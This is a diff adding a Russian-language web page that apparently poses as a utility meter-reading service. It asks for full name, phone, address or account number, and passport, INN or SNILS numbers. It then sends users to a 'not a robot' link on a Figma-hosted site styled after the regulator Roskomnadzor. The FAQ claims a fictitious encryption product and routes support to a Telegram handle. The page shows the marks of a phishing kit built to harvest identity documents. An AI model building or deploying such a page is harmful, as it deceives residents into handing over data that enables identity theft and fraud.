@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ЖКХ Web App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 font-sans">
+    <div class="container mx-auto p-4 max-w-lg">
+        <!-- Main Menu -->
+        <div id="main-menu" class="space-y-4">
+            <h1 class="text-2xl font-bold text-center">🏠 Добро пожаловать в ЖКХ-бот!</h1>
+            <p class="text-center">💧 Управляйте своими услугами легко и быстро! ✨</p>
+            <button onclick="showForm('fullname')" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">🔢 Передать показания</button>
+            <button onclick="showFAQ()" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600">❓ Частые вопросы</button>
+            <button onclick="showInstructions()" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600">ℹ️ Инструкция</button>
+            <button onclick="showSupport()" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600">📞 Связаться с техподдержкой</button>
+        </div>
+
+        <!-- Form Section -->
+        <div id="form-section" class="hidden space-y-4">
+            <h2 id="form-title" class="text-xl font-semibold"></h2>
+            <p id="form-warning" class="text-red-500 font-bold"></p>
+            <input id="form-input" type="text" class="w-full p-2 border rounded" placeholder="Введите данные">
+            <div id="form-options" class="space-y-2"></div>
+            <button onclick="goBack()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">↩️ Назад</button>
+        </div>
+
+        <!-- FAQ Section -->
+        <div id="faq-section" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">❓ Частые вопросы: 🌟</h2>
+            <button onclick="showFAQAnswer('deadline')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">⏳ До какого числа нужно передавать показания?</button>
+            <button onclick="showFAQAnswer('penalty')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">💸 Что будет, если не передать данные вовремя?</button>
+            <button onclick="showFAQAnswer('safe')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">🔒 Это безопасно?</button>
+            <button onclick="showFAQAnswer('telegram')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">⚡️ Почему теперь через Telegram?</button>
+            <button onclick="showFAQAnswer('fix')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">🔁 Можно ли исправить ошибку?</button>
+            <button onclick="showFAQAnswer('documents')" class="w-full bg-gray-200 py-2 rounded hover:bg-gray-300">📑 Какие документы можно использовать?</button>
+            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">↩️ Вернуться в меню</button>
+        </div>
+
+        <!-- FAQ Answer Section -->
+        <div id="faq-answer-section" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">Ответ</h2>
+            <p id="faq-answer" class="text-gray-700"></p>
+            <button onclick="showFAQ()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">↩️ Назад</button>
+        </div>
+
+        <!-- Instructions Section -->
+        <div id="instructions-section" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">ℹ️ Инструкция</h2>
+            <p class="text-gray-700">
+                📋 Чтобы передать показания:<br>
+                1️⃣ Нажмите «Указать ФИО».<br>
+                2️⃣ Введите номер телефона.<br>
+                3️⃣ Введите номер лицевого счета или адрес.<br>
+                4️⃣ Выберите документ и введите его номер.<br>
+                5️⃣ Получите подтверждение. ✨<br><br>
+                На любом этапе вы можете нажать '↩️ Назад', чтобы вернуться на предыдущий шаг. 💧
+            </p>
+            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">↩️ Вернуться в меню</button>
+        </div>
+
+        <!-- Support Section -->
+        <div id="support-section" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">📞 Связаться с техподдержкой</h2>
+            <p class="text-gray-700">
+                Для связи с техподдержкой перейдите по ссылке: <a href="tg://resolve?domain=techsupgkh" class="text-blue-500">@techsupgkh</a> ✨
+            </p>
+            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">↩️ Вернуться в меню</button>
+        </div>
+
+        <!-- Confirmation Section -->
+        <div id="confirmation-section" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">Подтверждение</h2>
+            <p class="text-gray-700">Для завершения подтвердите, что вы не робот! ✨</p>
+            <a href="https://roskomnadzor.figma.site/" target="_blank" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 text-center block">✅ Подтвердить, что я не робот</a>
+            <button onclick="showMainMenu()" class="w-full bg-gray-300 text-black py-2 rounded hover:bg-gray-400">↩️ Вернуться в меню</button>
+        </div>
+    </div>
+
+    <script>
+        let currentState = 'main';
+        let formData = {
+            fullname: '',
+            phone: '',
+            account_or_address_choice: '',
+            account_or_address_value: '',
+            document_type: '',
+            document_number: ''
+        };
+
+        function showMainMenu() {
+            document.getElementById('main-menu').classList.remove('hidden');
+            document.getElementById('form-section').classList.add('hidden');
+            document.getElementById('faq-section').classList.add('hidden');
+            document.getElementById('faq-answer-section').classList.add('hidden');
+            document.getElementById('instructions-section').classList.add('hidden');
+            document.getElementById('support-section').classList.add('hidden');
+            document.getElementById('confirmation-section').classList.add('hidden');
+            currentState = 'main';
+            formData = { fullname: '', phone: '', account_or_address_choice: '', account_or_address_value: '', document_type: '', document_number: '' };
+        }
+
+        function showForm(state) {
+            currentState = state;
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('form-section').classList.remove('hidden');
+            document.getElementById('form-options').innerHTML = '';
+            document.getElementById('form-warning').innerHTML = '<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>';
+            const input = document.getElementById('form-input');
+            input.value = formData[state] || '';
+            input.focus();
+
+            if (state === 'fullname') {
+                document.getElementById('form-title').textContent = '👤 Укажите Фамилию Имя Отчество полностью (только текст):';
+            } else if (state === 'phone') {
+                document.getElementById('form-title').textContent = '📞 Введите номер телефона (начните с +7 или 7, например: +79991234567):';
+            } else if (state === 'account_or_address_choice') {
+                document.getElementById('form-title').textContent = 'Выберите способ идентификации: 🌟';
+                document.getElementById('form-input').classList.add('hidden');
+                document.getElementById('form-options').innerHTML = `
+                    <button onclick="selectChoice('🏠 Адрес')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">🏠 Адрес</button>
+                    <button onclick="selectChoice('💳 Лицевой счёт')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">💳 Лицевой счёт</button>
+                `;
+            } else if (state === 'account_or_address_value') {
+                document.getElementById('form-input').classList.remove('hidden');
+                document.getElementById('form-title').textContent = formData.account_or_address_choice === '🏠 Адрес' 
+                    ? 'Введите ваш адрес (пример: г. Москва, ул. Ленина, д. 10):' 
+                    : 'Введите номер лицевого счёта (пример: 40817810099910004312):';
+            } else if (state === 'document_type') {
+                document.getElementById('form-title').textContent = 'Выберите документ: 🌟';
+                document.getElementById('form-input').classList.add('hidden');
+                document.getElementById('form-options').innerHTML = `
+                    <button onclick="selectDocument('Паспорт')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">📄 Паспорт</button>
+                    <button onclick="selectDocument('ИНН')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">🧾 ИНН</button>
+                    <button onclick="selectDocument('СНИЛС')" class="w-full bg-blue-200 py-2 rounded hover:bg-blue-300">🟢 СНИЛС</button>
+                `;
+            } else if (state === 'document_number') {
+                document.getElementById('form-input').classList.remove('hidden');
+                document.getElementById('form-title').textContent = `Введите ${formData.document_type} (пример: ${formData.document_type === 'Паспорт' ? '4510 123456' : formData.document_type === 'ИНН' ? '500100732259' : '112-233-445 95'}):`;
+            }
+        }
+
+        function selectChoice(choice) {
+            formData.account_or_address_choice = choice;
+            saveData();
+            showForm('account_or_address_value');
+        }
+
+        function selectDocument(doc) {
+            formData.document_type = doc;
+            saveData();
+            showForm('document_number');
+        }
+
+        function goBack() {
+            if (currentState === 'fullname') {
+                showMainMenu();
+            } else if (currentState === 'phone') {
+                showForm('fullname');
+            } else if (currentState === 'account_or_address_choice') {
+                showForm('phone');
+            } else if (currentState === 'account_or_address_value') {
+                showForm('account_or_address_choice');
+            } else if (currentState === 'document_type') {
+                showForm('account_or_address_value');
+            } else if (currentState === 'document_number') {
+                showForm('document_type');
+            }
+        }
+
+        function saveData(isComplete = false) {
+            const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+            const userId = 'web_user_' + Math.random().toString(36).substring(2, 15);
+            const username = 'web_user';
+            const userWithBot = `@${username} (ЖКХ)`;
+            const record = `${timestamp}\t${userId}\t${userWithBot}\t${formData.fullname}\t${formData.phone}\t${formData.account_or_address_choice} ${formData.account_or_address_value}\t${formData.document_type} ${formData.document_number}\n`;
+
+            let records = localStorage.getItem('reg.txt') || '';
+            records += record;
+            localStorage.setItem('reg.txt', records);
+            console.log('Saved:', record.trim());
+
+            if (isComplete) {
+                document.getElementById('form-section').classList.add('hidden');
+                document.getElementById('confirmation-section').classList.remove('hidden');
+                currentState = 'confirmation';
+            }
+        }
+
+        document.getElementById('form-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const value = e.target.value.trim();
+                if (currentState === 'fullname') {
+                    if (!/^[А-Яа-яЁё\s-]+$/.test(value)) {
+                        alert('❌ ФИО должно содержать только буквы. Попробуйте снова. 🔥');
+                        return;
+                    }
+                    formData.fullname = value.replace(/\s+/g, ' ');
+                    saveData();
+                    showForm('phone');
+                } else if (currentState === 'phone') {
+                    const digits = value.replace(/[^0-9]/g, '');
+                    if (!value.startsWith('+7') && !value.startsWith('7')) {
+                        alert('❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. 🔥');
+                        return;
+                    }
+                    if (digits.length < 10 || digits.length > 11) {
+                        alert('❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. 🔥');
+                        return;
+                    }
+                    formData.phone = value;
+                    saveData();
+                    showForm('account_or_address_choice');
+                } else if (currentState === 'account_or_address_value') {
+                    if (formData.account_or_address_choice === '🏠 Адрес') {
+                        if (value.length < 5 || !/\d/.test(value)) {
+                            alert('❌ Укажите корректный адрес (пример: г. Москва, ул. Ленина, д. 10). Попробуйте снова. 🔥');
+                            return;
+                        }
+                    } else {
+                        if (!/^\d+$/.test(value) || value.length < 4) {
+                            alert('❌ Номер лицевого счёта должен содержать только цифры (не менее 4). Попробуйте снова. 🔥');
+                            return;
+                        }
+                    }
+                    formData.account_or_address_value = value;
+                    saveData();
+                    showForm('document_type');
+                } else if (currentState === 'document_number') {
+                    formData.document_number = value;
+                    saveData(true);
+                }
+            }
+        });
+
+        function showFAQ() {
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('faq-section').classList.remove('hidden');
+            currentState = 'faq';
+        }
+
+        function showFAQAnswer(answer) {
+            document.getElementById('faq-section').classList.add('hidden');
+            document.getElementById('faq-answer-section').classList.remove('hidden');
+            const answers = {
+                'deadline': '📌 Показания счетчиков воды и электроэнергии необходимо передавать до 25 числа каждого месяца. 💧',
+                'penalty': '⚠️ Плата будет начислена по среднему — исходя из показаний приборов учета за последние полгода. 🔥',
+                'safe': '🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). ✨',
+                'telegram': '⚡️ В связи с нестабильной работой web-платформ был создан дополнительный ресурс. 💧',
+                'fix': '✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌟',
+                'documents': '👉 Паспорт, ИНН, СНИЛС или Лицевой счёт. 💧'
+            };
+            document.getElementById('faq-answer').textContent = answers[answer];
+            currentState = 'faq-answer';
+        }
+
+        function showInstructions() {
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('instructions-section').classList.remove('hidden');
+            currentState = 'instructions';
+        }
+
+        function showSupport() {
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('support-section').classList.remove('hidden');
+            currentState = 'support';
+        }
+    </script>
+</body>
+</html>
